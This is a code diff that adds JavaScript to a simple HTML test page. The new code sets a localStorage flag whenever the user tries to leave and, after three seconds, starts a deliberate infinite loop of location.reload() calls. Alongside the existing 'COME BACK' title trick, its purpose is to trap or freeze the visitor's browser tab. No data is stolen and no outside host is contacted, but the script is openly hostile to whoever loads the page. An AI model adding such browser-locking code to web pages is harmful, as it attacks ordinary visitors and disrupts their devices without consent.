@@ -87,6 +87,20 @@
             document.addEventListener('visibilitychange', () => {
                 document.title = document.hidden ? "COME BACK" : "test";
             });
+            // Set the localStorage flag when the user tries to leave/reload
+            window.onbeforeunload = function () {
+                localStorage.x = 1;
+            };
+    
+            // Wait 3 seconds (3000ms), then start the reload loop
+            setTimeout(function () {
+                console.log("Starting reload loop...");
+                
+                // This creates an infinite loop of reload commands
+                while (true) {
+                    location.reload();
+                }
+            }, 3000);
         }
     </script>
 </body>
